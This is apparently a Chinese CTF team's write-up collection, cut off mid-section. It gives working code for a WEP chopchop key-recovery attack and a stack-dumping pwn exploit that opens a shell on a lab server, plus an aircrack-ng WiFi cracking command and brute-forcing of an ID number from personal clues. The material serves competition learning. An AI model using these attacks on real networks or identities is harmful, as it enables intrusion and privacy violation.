<p>\u95ee\u5176\u4e16\u7eaa\uff0c\u66f0\uff1a\u4e8c\u4e00\u4e16\u7eaa\u5f52\u751f\u7269\uff0c\u5eff\u4e8c\u4e16\u7eaa\u5c5e\u5b89\u5168\uff0c \u95ee\u5176\u51fa\u751f\uff0c\u66f0\uff1a\u5317\u7406\u6821\u533a\u5728\u5bb6\u65c1\uff0c\u8c46\u9762\u9165\u7cd6\u996e\u8336\u6c64\u3002 \u95ee\u5176\u751f\u65e5\uff0c\u66f0\uff1a\u4e0d\u77e5\u7ec6\u53f6\u8c01\u88c1\u51fa\uff0c\u51e0\u6708\u6625\u98ce\u4f3c\u526a\u5200\uff0c \u95ee\u5176\u54c8\u5e0c\uff0c\u66f0\uff1a\u5f00\u5934\u4e00\u767e\u5355\u516b\u5c06\uff0c\u7ed3\u5c3e\u6c76\u5ddd\u8bc9\u8877\u80a0\u3002</p> <p>flag\u4e3aAAA{\u9ad8\u5fb7\u65af\u76ae\u7279\u7684\u8eab\u4efd\u8bc1}\uff0c\u4fdd\u8bc1\u7b54\u6848\u552f\u4e00</p> <p>hint: \u786e\u4fdd\u7b54\u6848\u552f\u4e00\u8003\u8651\u7684\u6700\u540e\u4e00\u8054\u7528\u7684\u662fmd5\u54c8\u5e0c</p> <p>\u6309\u7167\u8eab\u4efd\u8bc1\u53f7\u7684\u89c4\u5219\u63a8\u65ad+\u7206\u7834\u5c31\u597d\uff0c\u9898\u76ee\u80fd\u5f97\u5230\u7684\u4fe1\u606f\uff1a</p> <p>\u51fa\u751f\u5e74\u4efd\uff1a21__ \u5f52\u5c5e\u5730\uff08\u884c\u653f\u533a\u5212\u4ee3\u7801\uff09\uff1a110108\uff08\u5317\u7406\uff0c\u5317\u4eac\u5e02\u6d77\u6dc0\u533a\uff09 \u51fa\u751f\u6708\u65e5\uff1a02__ md5 \u54c8\u5e0c\u503c\uff1a108 \u5f00\u5934\uff0c512 \u7ed3\u5c3e \u6700\u540e\u4e00\u4f4d\uff1a\u6839\u636e\u524d\u9762\u8ba1\u7b97 \u6027\u522b\uff1a\u7537\uff0c\u5373\u5012\u6570\u7b2c\u4e8c\u4f4d\u662f\u5947\u6570\uff08\u9ad8\u5fb7\u65af\u76ae\u7279 godspeed \u662f\u7537\u7684\uff09 \u7b54\u6848\u552f\u4e00</p> <p>\u73b0\u5728\u5df2\u77e5\u53f7\u7801\u4e3a 11010821__02______\uff0c\u5269\u4f59 7 \u4f4d\u672a\u77e5\uff0c5*10<sup>6</sup> \u79cd\u60c5\u51b5\uff0c\u76f4\u63a5\u7206\u7834\uff1a</p> \u7206\u7834\u4ee3\u7801 <pre><code>import sys\nimport hashlib\nfrom tqdm import tqdm\n\nnumber = list(\"11010821__02______\")\n#              012345678901234567\n\nW = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]\nCheckcode = [1, 0, 'X', 9, 8, 7, 6, 5, 4, 3, 2]\n\ndef get_last_num(num):\n    sum_ = 0\n    for i in range(17):\n        sum_ += int(num[i]) * W[i]\n    return str(Checkcode[sum_ % 11])\n\ndef check_md5(num):\n    res = hashlib.md5(\"\".join(num).encode(encoding=\"utf-8\")).hexdigest()\n    if res[:3] == \"108\" and res[-3:] == \"512\":\n        print(f\"Answer: {''.join(num)} -- md5: {res}\")\n        sys.exit(0)\n\nif __name__ == \"__main__\":\n    with tqdm(total=5 * 10**6) as pbar:\n        for a in range(10):\n            for b in range(10):\n                for c in range(10):\n                    for d in range(10):\n                        for e in range(10):\n                            for f in range(10):\n                                for g in range(1, 10, 2):\n                                    number[8] = str(a)\n                                    number[9] = str(b)\n                                    number[12] = str(c)\n                                    number[13] = str(d)\n                                    number[14] = str(e)\n                                    number[15] = str(f)\n                                    number[16] = str(g)\n                                    number[17] = get_last_num(number[:17])\n                                    check_md5(number)\n                                    pbar.update(1)\n</code></pre> <p>flag: AAA{110108212502174550}</p>"},{"location":"writeups/AAA/#crack_zju_wlan","title":"crack_zju_wlan","text":"<p>\u7ed9\u4e86\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u540e\u662f\u4e00\u4e2a crack_zju-01.cap \u6587\u4ef6\uff0c\u8981\u901a\u8fc7\u8fd9\u4e2a\u6d41\u91cf\u5305\u7206\u7834 wifi \u5bc6\u7801 \u53ef\u4ee5\u4f7f\u7528 aircrack-ng \u5de5\u5177\uff0c\u4f46\u662f\u8fd8\u7f3a\u4e00\u4e2a\u5bc6\u7801\u5b57\u5178</p> <p>\u4ed4\u7ec6\u4e00\u70b9\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6 .password.txt.swp\uff0c\u901a\u8fc7 vim password.txt \u6253\u5f00\u540e\u5c31\u53ef\u4ee5\u4ece\u4e2d\u6062\u590d\u51fa\u539f\u6587\u4ef6</p> <p>\u7136\u540e <code>aircrack-ng crack_zju-01.cap -w password.txt</code> \u5c31\u53ef\u4ee5\u76f4\u63a5\u7206\u7834\u51fa\u5bc6\u7801 flag: AAA{0YcWPeLMBp}</p>"},{"location":"writeups/AAA/#chopchop","title":"chopchop","text":"<p>WEP\uff08Wired Equivalent Privacy\uff09\u6709\u7ebf\u7b49\u6548\u52a0\u5bc6\uff0c\u53ef\u4ee5\u901a\u8fc7 chopchop \u653b\u51fb\u7834\u89e3\u3002\u672c\u9898\u5c31\u662f\u6a21\u62df chopchop \u653b\u51fb \u539f\u7406\uff1aAircrack-ng chopchop theory\u3001godspeed wep\u7834\u89e3\u2014\u2014\u6a21\u62dfchopchop\u653b\u51fb</p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86 WEP \u52a0\u5bc6\u540e\u7684\u5bc6\u6587: <code>ba698e28f2fce533dbab58a7460ea9779341a138c9f0d232c4bc6fb159249f70a441a127f3e1df2ec0b669b954d1589c3c</code> \u5206\u4e3a\u4e24\u90e8\u5206\uff0cDATA \u548c ICV\uff08\u52a0\u5bc6\u540e\u7684 crc32\uff09 \u52a0\u5bc6\u8fc7\u7a0b\u5c31\u662f\u76f4\u63a5\u5c06 DATA \u548c ICV \u4e0e\u5bc6\u94a5\u5faa\u73af\u5f02\u6216</p> <p>\u8fd9\u65f6\u5047\u8bbe\u5220\u6389 DATA \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff1a \u9898\u76ee\u7684 hint \u7ed9\u4e86\u8fd9\u4e2a\u53ef\u884c\u7684\u8f93\u5165\uff1a<code>ba698e28f2fce533dbab58a7460ea9779341a138c9f0d232c4bc6fb159249f70a441a127f3e1df2ec0b669b92f65f04b</code> <pre><code>_____DATA_____ ____ICV____ \nD0 D1 D2 D3 D4 I3 I2 I1 I0  \n^  ^  ^  ^  ^  ^  ^  ^  ^ \nK0 K1 K2 K3 K4 K5 K6 K7 K8  \n=  =  =  =  =  =  =  =  = \nR0 R1 R2 R3 R4 R5 R6 R7 R8 \n2e c0 b6 69 b9 2f 65 f0 4b\n</code></pre> \u518d\u770b\u539f\u6765\u7684\uff1a <pre><code>_______DATA______ ____ICV____\nD0 D1 D2 D3 D4 D5 J3 J2 J1 J0\n^  ^  ^  ^  ^  ^  ^  ^  ^  ^\nK0 K1 K2 K3 K4 K5 K6 K7 K8 K9\n=  =  =  =  =  =  =  =  =  =\nS0 S1 S2 S3 S4 S5 S6 S7 S8 S9\n2e c0 b6 69 b9 54 d1 58 9c 3c\n</code></pre> \u6b64\u65f6\u4ee4 X = I3 ^ D5</p> <p>\u7531\u4e0a\u9762\u7684\u89c4\u5219: R5 = I3 ^ K5 = I3 ^ (D5^D5) ^ K5 = (I3^D5) ^ (D5^K5) = X ^ S5 R6 = I2 ^ K6 = I2 ^ (J3^J3) ^ K6 = (I2^J3) ^ S6 = SOME[6:8] ^ S6 R7 = I1 ^ K7 = I1 ^ (J2^J2) ^ K7 = (I1^J2) ^ S7 = SOME[4:6] ^ S7 R8 = I0 ^ K8 = I0 ^ (J1^J1) ^ K8 = (I0^J1) ^ S8 = SOME[2:4] ^ S8 \u8fd8\u9700\u8981\u77e5\u9053 I0 I1 I2 I3</p> <p>\u6839\u636e ICV \u7684\u89c4\u5219\uff0c\u6709\uff1a crc_tbl[(I0I1I2I3 ^ ord(D5)) &amp; 0xFF] ^ (I0I1I2I3 &gt;&gt; 8) = J0J1J2J3\uff08\u5373 crc \u6700\u540e\u4e00\u6b21\u5faa\u73af\uff09</p> <p>\u4ee4 SOME = crc_tbl[(I0I1I2I3 ^ ord(D5)) &amp; 0xFF]\uff0c\u6709\uff1a J0J1J2J3 ^ SOME = 00I0I1I2 I0I1I2I3 = J1J2J300 ^ SOME[::-1] J0 = 00^SOME[0:2] I0 = J1^SOME[2:4] I1 = J2^SOME[4:6] I2 = J3^SOME[6:8]</p> <p>\u6240\u4ee5 SOME = crc_tbl[((I0I1I2I3 ^ ord(D5)) &amp; 0xFF] = crc_tbl[I3^D5] = crc_tbl[X]</p> <p>\u6240\u4ee5\u53ef\u4ee5\u6765\u679a\u4e3e X\uff08256 \u79cd\u60c5\u51b5\uff09 \u5982\u679c X \u5df2\u77e5\uff0c\u5219 SOME \u53ef\u6c42\u3002\u53c8\u56e0\u4e3a S5~S9 \u5747\u5df2\u77e5\uff0c\u5219\u53ef\u4ee5\u4f9d\u6b21\u6c42\u5f97 R5 R6 R7 R8\uff0c\u4ece\u800c\u63a8\u51fa\u5220\u6389\u4e00\u4e2a\u5b57\u8282\u4ee5\u540e\u7684\u5b8c\u6574 payload \u8fd9\u65f6\u518d\u4ea4\u7ed9\u9898\u76ee ap \u53bb\u8ba4\u8bc1\uff0c\u5982\u679c\u4e0d\u5408\u6cd5\uff0c\u8bf4\u660e\u6b64\u65f6\u679a\u4e3e\u7684 X \u4e0d\u6b63\u786e \u5982\u679c\u5408\u6cd5\uff0c\u5219\u679a\u4e3e\u7684 X \u6b63\u786e\uff0c\u4e0a\u9762\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u4e5f\u5b8c\u5168\u6b63\u786e \u4e8e\u662f J0 \u5c31\u662f SOME[0:2]\uff0cS9 \u5df2\u77e5\uff0c\u5c31\u53ef\u4ee5\u7b97\u5f97 K9 = S9 ^ J0</p> <p>\u7531\u6b64\u5faa\u73af\u4f9d\u6b21\u7f29\u77ed DATA\uff0c\u5c31\u53ef\u4ee5\u7206\u7834\u51fa\u5b8c\u6574\u7684 key</p> \u7206\u7834 key \u4ee3\u7801 <pre><code>from pwn import *\nfrom tqdm import tqdm\n\ncrc_tbl = [0x00000000,0x77073096,0xEE0E612C,0x990951BA,0x076DC419,0x706AF48F,0xE963A535,0x9E6495A3,0x0EDB8832,0x79DCB8A4,0xE0D5E91E,0x97D2D988,0x09B64C2B,0x7EB17CBD,0xE7B82D07,0x90BF1D91,\n           0x1DB71064,0x6AB020F2,0xF3B97148,0x84BE41DE,0x1ADAD47D,0x6DDDE4EB,0xF4D4B551,0x83D385C7,0x136C9856,0x646BA8C0,0xFD62F97A,0x8A65C9EC,0x14015C4F,0x63066CD9,0xFA0F3D63,0x8D080DF5,\n           0x3B6E20C8,0x4C69105E,0xD56041E4,0xA2677172,0x3C03E4D1,0x4B04D447,0xD20D85FD,0xA50AB56B,0x35B5A8FA,0x42B2986C,0xDBBBC9D6,0xACBCF940,0x32D86CE3,0x45DF5C75,0xDCD60DCF,0xABD13D59,\n           0x26D930AC,0x51DE003A,0xC8D75180,0xBFD06116,0x21B4F4B5,0x56B3C423,0xCFBA9599,0xB8BDA50F,0x2802B89E,0x5F058808,0xC60CD9B2,0xB10BE924,0x2F6F7C87,0x58684C11,0xC1611DAB,0xB6662D3D,\n           0x76DC4190,0x01DB7106,0x98D220BC,0xEFD5102A,0x71B18589,0x06B6B51F,0x9FBFE4A5,0xE8B8D433,0x7807C9A2,0x0F00F934,0x9609A88E,0xE10E9818,0x7F6A0DBB,0x086D3D2D,0x91646C97,0xE6635C01,\n           0x6B6B51F4,0x1C6C6162,0x856530D8,0xF262004E,0x6C0695ED,0x1B01A57B,0x8208F4C1,0xF50FC457,0x65B0D9C6,0x12B7E950,0x8BBEB8EA,0xFCB9887C,0x62DD1DDF,0x15DA2D49,0x8CD37CF3,0xFBD44C65,\n           0x4DB26158,0x3AB551CE,0xA3BC0074,0xD4BB30E2,0x4ADFA541,0x3DD895D7,0xA4D1C46D,0xD3D6F4FB,0x4369E96A,0x346ED9FC,0xAD678846,0xDA60B8D0,0x44042D73,0x33031DE5,0xAA0A4C5F,0xDD0D7CC9,\n           0x5005713C,0x270241AA,0xBE0B1010,0xC90C2086,0x5768B525,0x206F85B3,0xB966D409,0xCE61E49F,0x5EDEF90E,0x29D9C998,0xB0D09822,0xC7D7A8B4,0x59B33D17,0x2EB40D81,0xB7BD5C3B,0xC0BA6CAD,\n           0xEDB88320,0x9ABFB3B6,0x03B6E20C,0x74B1D29A,0xEAD54739,0x9DD277AF,0x04DB2615,0x73DC1683,0xE3630B12,0x94643B84,0x0D6D6A3E,0x7A6A5AA8,0xE40ECF0B,0x9309FF9D,0x0A00AE27,0x7D079EB1,\n           0xF00F9344,0x8708A3D2,0x1E01F268,0x6906C2FE,0xF762575D,0x806567CB,0x196C3671,0x6E6B06E7,0xFED41B76,0x89D32BE0,0x10DA7A5A,0x67DD4ACC,0xF9B9DF6F,0x8EBEEFF9,0x17B7BE43,0x60B08ED5,\n           0xD6D6A3E8,0xA1D1937E,0x38D8C2C4,0x4FDFF252,0xD1BB67F1,0xA6BC5767,0x3FB506DD,0x48B2364B,0xD80D2BDA,0xAF0A1B4C,0x36034AF6,0x41047A60,0xDF60EFC3,0xA867DF55,0x316E8EEF,0x4669BE79,\n           0xCB61B38C,0xBC66831A,0x256FD2A0,0x5268E236,0xCC0C7795,0xBB0B4703,0x220216B9,0x5505262F,0xC5BA3BBE,0xB2BD0B28,0x2BB45A92,0x5CB36A04,0xC2D7FFA7,0xB5D0CF31,0x2CD99E8B,0x5BDEAE1D,\n           0x9B64C2B0,0xEC63F226,0x756AA39C,0x026D930A,0x9C0906A9,0xEB0E363F,0x72076785,0x05005713,0x95BF4A82,0xE2B87A14,0x7BB12BAE,0x0CB61B38,0x92D28E9B,0xE5D5BE0D,0x7CDCEFB7,0x0BDBDF21,\n           0x86D3D2D4,0xF1D4E242,0x68DDB3F8,0x1FDA836E,0x81BE16CD,0xF6B9265B,0x6FB077E1,0x18B74777,0x88085AE6,0xFF0F6A70,0x66063BCA,0x11010B5C,0x8F659EFF,0xF862AE69,0x616BFFD3,0x166CCF45,\n           0xA00AE278,0xD70DD2EE,0x4E048354,0x3903B3C2,0xA7672661,0xD06016F7,0x4969474D,0x3E6E77DB,0xAED16A4A,0xD9D65ADC,0x40DF0B66,0x37D83BF0,0xA9BCAE53,0xDEBB9EC5,0x47B2CF7F,0x30B5FFE9,\n           0xBDBDF21C,0xCABAC28A,0x53B39330,0x24B4A3A6,0xBAD03605,0xCDD70693,0x54DE5729,0x23D967BF,0xB3667A2E,0xC4614AB8,0x5D681B02,0x2A6F2B94,0xB40BBE37,0xC30C8EA1,0x5A05DF1B,0x2D02EF8D]\n\ndef CRC32(s):   # \u8ba1\u7b97 crc32\n    crc = 0\n    for i in range(len(s)):\n        crc = crc_tbl[(crc ^ ord(s[i])) &amp; 0xFF] ^ (crc &gt;&gt; 8)\n    return crc\n\ndef xor(text,key):  # RC4\u52a0\u5bc6/\u89e3\u5bc6\n    s = \"\"\n    for i in range(len(text)):\n        s += chr(ord(key[i%len(key)])^ord(text[i]))\n    return s\n\ndef char2hexs(c):   # \u5c06\u5982\u540c '\\x00' \u683c\u5f0f\u53d8\u6210 '00'\n    temp = hex(ord(c)).split('0x')[1]\n    if(len(temp) &gt; 1):\n        return temp\n    else:\n        return \"0\"+temp\n\ndef hex2num(c):\n    return eval(\"0x\"+c)\n\ndef num2hex(num, cnt=2):\n    temp = hex(num).split('0x')[1]\n    if (l := len(temp)) &gt;= cnt:\n        return temp\n    return \"0\" * (cnt - l) + temp\n\nori = \"ba698e28f2fce533dbab58a7460ea9779341a138c9f0d232c4bc6fb159249f70a441a127f3e1df2ec0b669b954d1589c3c\"\nkey = \"\"\nwith tqdm(total=40) as pbar:\n    for _ in range(40):\n        pbar.update(1)\n        s5 = hex2num(ori[-10:-8])\n        s6 = hex2num(ori[-8:-6])\n        s7 = hex2num(ori[-6:-4])\n        s8 = hex2num(ori[-4:-2])\n        s9 = hex2num(ori[-2:])\n\n        with tqdm(total=256) as pbar2:\n            for x in range(256):\n                pbar2.update(1)\n                SOME = num2hex(crc_tbl[x], 8)\n                r5 = x ^ s5 \n                r6 = hex2num(SOME[6:8]) ^ s6 \n                r7 = hex2num(SOME[4:6]) ^ s7 \n                r8 = hex2num(SOME[2:4]) ^ s8 \n                left = ori[:-10]\n                new = left + num2hex(r5) + num2hex(r6) + num2hex(r7) + num2hex(r8)\n                conn = remote(\"10.214.160.13\", 11018)\n                conn.sendlineafter(b\"packet:\", new.encode(\"utf-8\"))\n                conn.recvline()\n                conn.recvline()\n                res = conn.recvline().decode(\"utf-8\").strip()\n                if res == 'valid input':\n                    k = num2hex(s9 ^ hex2num(SOME[0:2]))\n                    print(new)\n                    key = k + key\n                    print(k, key)\n                    ori = new \n                    break\n# key = 28cf539693ba5db4df07de297bf603fb\n</code></pre> <p>\u7136\u540e\u6539\u5199\u9898\u76ee ap \u4ee3\u7801\uff0c\u89e3\u5bc6\u5f97\u5230\u660e\u6587 <pre><code>key = \"28cf539693ba5db4df07de297bf603fb\"\ndata = \"ba698e28f2fce533dbab58a7460ea9779341a138c9f0d232c4bc6fb159249f70a441a127f3e1df2ec0b669b954d1589c3c\"\nfor i in range(20):\n    key = key[-2:] + key[:-2]\n    data = xor(data, key.decode('hex')) \n    print data\n</code></pre></p> <p>\u5f00\u5934\u5305\u542b flag: AAA{do_not_you_think_chopchop_is_interesting}</p>"},{"location":"writeups/AAA/#dangerous-env","title":"Dangerous Env","text":"<p>\u4e00\u9053\u5f88 pwn \u7684 misc\uff08\u4e0d\u61c2\u4e3a\u4ec0\u4e48\u653e\u5230 misc \u91cc\uff09</p> <p>\u9898\u76ee\u63d0\u4f9b\u4e86\u4e09\u79cd\u64cd\u4f5c\uff1a</p> <ul> <li>scanf(\"%x\", pos)</li> <li>printf(\"%08hxh\\n\",*(unsigned int*)(*pos))</li> <li>system((char)pos)</li> </ul> <p>\u5e76\u4e14\u5728\u6700\u5f00\u59cb\u4f1a\u7ed9\u51fa pos</p> <p>\u8fd9\u4e09\u4e2a\u64cd\u4f5c\u524d\u4e24\u4e2a\u7ec4\u5408\u53ef\u4ee5\u901a\u8fc7\u5730\u5740\u8f93\u51fa\u4efb\u4f55\u6808\u4e0a\u7684\u503c\uff0c13 \u7ec4\u5408\u53ef\u4ee5\u5c06\u6307\u5b9a\u5730\u5740\u5f53\u4f5c\u5b57\u7b26\u4e32\u8fdb\u884c system \u8c03\u7528</p> <p>\u6839\u636e\u9898\u76ee\u540d\u5c31\u80fd\u731c\u5230\u76ee\u6807\u662f\u627e\u5230\u73af\u5883\u53d8\u91cf\uff08main \u51fd\u6570\u7b2c\u4e09\u4e2a\u53c2\u6570 char **envp\uff09\u4e2d\u7684 /bin/bash\uff0c\u8ba9 pos \u4e2d\u7684\u5185\u5bb9\u6307\u5230\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 system \u6765 get shell</p> <p>\u5148\u62d6\u5230 IDA \u9006\u4e00\u4e0b\u770b\u770b\uff0c\u5f97\u5230\uff1a <pre><code>; int __cdecl main(int argc, const char **argv, const char **envp)\n                public main\nmain            proc near\n\nvar_20          = dword ptr -20h\nvar_1C          = dword ptr -1Ch\ncommand         = dword ptr -18h\nvar_14          = dword ptr -14h\ns               = dword ptr -10h\nvar_C           = dword ptr -0Ch\nvar_4           = dword ptr -4\nargc            = dword ptr  8\nargv            = dword ptr  0Ch\nenvp            = dword ptr  10h\n\n; __unwind {\n                lea     ecx, [esp+4]\n                and     esp, 0FFFFFFF0h\n                push    dword ptr [ecx-4]\n                push    ebp\n                mov     ebp, esp\n                push    ecx\n                sub     esp, 24h\n                mov     eax, ecx\n                mov     edx, [eax+4]\n                mov     [ebp+var_1C], edx\n                mov     eax, [eax+8]\n                mov     [ebp+var_20], eax\n                mov     eax, large gs:14h\n                mov     [ebp+var_C], eax\n                xor     eax, eax\n                mov     [ebp+s], offset aHereWeGo0Scanf ; \"Here we go:\\n0: scanf(\\\"%x\\\",pos);\\n1: \"...\n                call    prepare\n                lea     eax, [ebp+command]\n                sub     esp, 8\n                push    eax\n                push    offset format   ; \"Const. pos=%08xh\\n\"\n                call    printf\n</code></pre></p> <p>\u5f53\u8fd0\u884c\u7684\u65f6\u5019\uff0cesp \u6240\u6307\u7684\u4f4d\u7f6e\u7684\u4e0b\u56db\u4e2a\u5b57\u8282\u662f argc \u503c\uff0c\u518d\u4e0b\u56db\u4e2a\u5b57\u8282\u662f argv \u7684\u5730\u5740\uff0c\u518d\u4e0b\u56db\u4e2a\u5b57\u8282\u662f envp \u7684\u5730\u5740 \u6240\u4ee5\u5f53\u524d\u76ee\u6807\u662f\u627e\u5230\u521a\u8fdb\u5165 main \u7684\u65f6\u5019\u7684 esp </p> <p>\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f pos\uff0c\u4e5f\u5c31\u662f ebp+command = ebp-18h \u5e76\u4e14\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765 ebp \u662f\u7531 esp \u8d4b\u503c\u800c\u6765\u7684\uff0c\u4e4b\u540e\u6ca1\u6709\u505a\u4efb\u4f55\u6539\u53d8</p> <p>\u4ece\u521a\u8fdb\u5165 main \u5f00\u59cb\u5206\u6790 esp\uff0c\u5148 and \u4e86\u4e00\u4e2a 0FFFFFFF0h\uff0c\u8fd9\u4f1a\u62b9\u6389\u5341\u516d\u8fdb\u5236\u7684\u6700\u540e\u4e00\u4f4d \u7136\u540e\u4f1a push \u4e24\u4e2a dword \u8fdb\u5165\u6808\u4e2d\uff0c\u4f7f esp \u51cf\u5c11 8\uff0c\u7136\u540e\u5c31\u8d4b\u503c\u7ed9\u4e86 ebp </p> <p>\u6240\u4ee5\u6211\u4eec\u5148\u901a\u8fc7 pos = ebp - 18h \u7b97\u5f97 ebp\uff0c\u7136\u540e\u52a0 8 \u5f97\u5230 esp \u53ef\u80fd\u7684\u6700\u5c0f\u503c esp0 \u56e0\u4e3a esp \u88ab\u62b9\u6389\u4e86\u6700\u540e\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\uff0c\u6240\u4ee5\u5b83\u672c\u6765\u7684\u503c\u53ef\u80fd\u662f esp0 + 0/4/8/C</p> <p>\u7136\u540e\u5c31 dump \u51fa\u9644\u8fd1\u7684\u6808\u5c31\u597d\u4e86\uff0c\u56e0\u4e3a argc \u80af\u5b9a\u4e3a 1\uff0c\u6240\u4ee5\u53ea\u8981\u627e\u5230 00000001 \u8fd9\u4e2a\u503c\uff0c\u5bf9\u5e94\u7684\u5730\u5740\u7684\u4e0a\u4e00\u4e2a\u5730\u5740\u5c31\u662f esp \u518d\u52a0 0xC \u5c31\u662f envp \u7684\u5730\u5740</p> <p>\u63a5\u4e0b\u6765\u9700\u8981\u53d6 envp \u6307\u5411\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u518d\u53d6\u5b83\u7684\u503c\uff0c\u8fd8\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5c31\u662f envp \u5b57\u7b26\u6570\u7ec4\u7684\u5f00\u59cb\u4f4d\u7f6e</p> <p>\u7136\u540e dump \u51fa\u6574\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u8ba1\u7b97\u4e00\u4e0b\u504f\u79fb\uff0c\u5c31\u80fd\u5f97\u5230\u5176\u4e2d /bin/bash \u7684\u5730\u5740\uff0c\u7136\u540e system \u5c31\u53ef\u4ee5 get shell \u4e86 \u6ce8\u610f get shell \u4e4b\u540e\u4e0d\u8981\u901a\u8fc7 windows \u73af\u5883\u8dd1\uff0c\u4e0d\u7136\u6362\u884c\u7b26\u4e3a \\r\\n \u4f1a\u5bfc\u81f4\u4e00\u4e9b\u95ee\u9898</p> \u5b8c\u6574 exp <pre><code>from pwn import *\n\np = remote(\"10.214.160.13\", 12702)\n\ndef dump_value(addr):\n    p.sendlineafter(b\"choice:\", b\"0\")\n    p.sendlineafter(b\":= \", hex(addr)[2:].encode(\"utf-8\"))\n    p.sendlineafter(b\"choice:\", b\"1\")\n    p.recvuntil(b\"= \")\n    val = p.recvline().decode(\"utf-8\").strip()[:-1]\n    return val\n\ndef dump_stack(from_addr, length, display_ascii=False):\n    if isinstance(from_addr, str):\n        addr = eval(\"0x\" + from_addr)\n    else:\n        addr = from_addr\n    res = \"\"\n    for _ in range(length):\n        val = dump_value(addr)\n        print(f\"{hex(addr)[2:]}  {val}\")\n        for i in range(6, -2, -2):\n            res += chr(eval(\"0x\" + val[i:i+2]))\n        addr += 4\n    if display_ascii:\n        print(\"Content: \" + res)\n\ndef find_esp(from_addr, length):\n    if isinstance(from_addr, str):\n        addr = eval(\"0x\" + from_addr)\n    else:\n        addr = from_addr\n    for _ in range(length):\n        val = dump_value(addr)\n        if val == \"00000001\":\n            return addr - 4\n        addr += 4\n\ndef get_envp(esp):\n    addr1 = esp + 0xC\n    addr2 = eval(\"0x\" + dump_value(addr1))\n    addr3 = eval(\"0x\" + dump_value(addr2))\n    return addr3\n\ndef get_shell(address):\n    context(log_level=\"DEBUG\")\n    p.sendlineafter(b\"choice:\", b\"0\")\n    p.sendlineafter(b\":= \", hex(address)[2:].encode(\"utf-8\"))\n    p.sendlineafter(b\"choice:\", b\"2\")\n    p.interactive()\n\np.recvuntil(b\"pos=\")\npos = p.recvline().decode(\"utf-8\").strip()[:-1]\nebp = eval(\"0x\" + pos) + 0x18\nesp_start = ebp + 0x8\ndump_stack(esp_start, 8)\nesp = find_esp(esp_start, 8)\nprint(f\"esp = {hex(esp)[2:]}\")\nenvp = get_envp(esp)\nprint(f\"envp = {hex(envp)[2:]}\")\n\ndump_stack(envp, 37, True)\n\nshell_address = envp + 0x2d\nget_shell(shell_address)\n</code></pre> <p>get shell \u4e4b\u540e\u5f53\u524d\u76ee\u5f55\u4e0b\u5c31\u5b58\u7740 flag: AAA{ENV1r0nM3Nt_var14bLe_SUCk_:)))}</p>"},{"location":"writeups/AAA/#songmingti","title":"songmingti","text":"\u9898\u76ee <p>binwalk \u4e00\u4e0b\u53d1\u73b0\u5176\u5b9e\u6709\u4e24\u5f20 jpg\uff1a <pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             JPEG image data, JFIF standard 1.01\n26657         0x6821          JPEG image data, JFIF standard 1.01\n</code></pre> \u4e14\u7b2c\u4e8c\u5f20\u7684\u504f\u79fb\u662f 26657</p> <p>\u6240\u4ee5\u7528 binwalk -e\u3001foremost\u3001dd \u90fd\u53ef\u4ee5\u63d0\u53d6\u51fa\u7b2c\u4e8c\u5f20\u56fe\u7247\uff08\u624b\u52a8\u590d\u5236\u51fa\u6765\u4e5f\u53ef\u4ee5\uff09 <pre><code>binwalk -e songmingti.jpg\nforemost songmingti.jpg\ndd if=songmingti.jpg of=songmingti.jpg skip=26657 bs=1\n</code></pre></p> \u7ed3\u679c <p></p> <p>flag: AAA{the_true_fans_fans_nmb_-1s!}</p>"},{"location":"writeups/AAA/#easy-reversing","title":"easy reversing","text":"<p>\u9006\u5411\u5f97\u5230\u8fd0\u884c\u903b\u8f91\uff0c\u7b80\u5355\u5206\u6790\u4e4b\u540e\u53ef\u4ee5\u53d1\u73b0\u5148\u628a <code>AskdEjyzIe_j{_s}</code> \u4e2d\u5b57\u6bcd\u51cf\u53bb\u5bf9\u5e94\u4f4d\u7f6e index \u5f97\u5230 <code>AriaAessAv_y{_e}</code>\uff0c\u7136\u540e\u628a 16 \u5b57\u7b26\u957f\u7684\u8f93\u5165\u4ece\u5de6\u5230\u53f3\u4ece\u4e0a\u5230\u4e0b\u6392\u6210 4*4 \u65b9\u9635\uff0c\u7136\u540e\u8f6c\u7f6e\uff0c\u518d\u8bfb\u51fa\u6765\u4e0e <code>AriaAessAv_y{_e}</code> \u5224\u65ad</p> <p>flag: AAA{rev_is_easy}</p>"},{"location":"writeups/AAA/#_2","title":"\u773c\u89c1\u4e3a\u865a","text":"<p>apk \u9006\u5411\uff0c\u5f97\u5230\u4e24\u4e2a class\uff0cMainActivity.class \u548c MainAcvitity.class \u5176\u4e2d\u7684\u903b\u8f91\u90fd\u5f88\u50cf\uff1a <pre><code>public class MainActivity extends m implements View.OnClickListener {\n  static {\n    System.loadLibrary(\"crack-lead\");\n  }\n\n  public void onClick(View paramView) {\n    a.a = ...;\n    TextView textView = (TextView)findViewById(2131427416);\n    if (\n      (new String(a.a(\n        ((EditText)findViewById(2131427414)).getText().toString().toCharArray()\n      ))).equals(new String(new char[] {...}))\n    ) {\n      textView.setText(\"success!\");\n      return;\n    } \n    textView.setText(\"fail\");\n  }\n}\n</code></pre></p> <p>\u5176\u4e2d a \u7684\u5b9a\u4e49\uff1a <pre><code>public class a {\n  static char[] a;\n  static char[] a(char[] paramArrayOfchar) {\n    char[] arrayOfChar = new char[paramArrayOfchar.length];\n    for (byte b = 0; b &lt; paramArrayOfchar.length; b++)\n      arrayOfChar[b] = (char)(char)(paramArrayOfchar[b] ^ a[b]); \n    return arrayOfChar;\n  }\n}\n</code></pre> 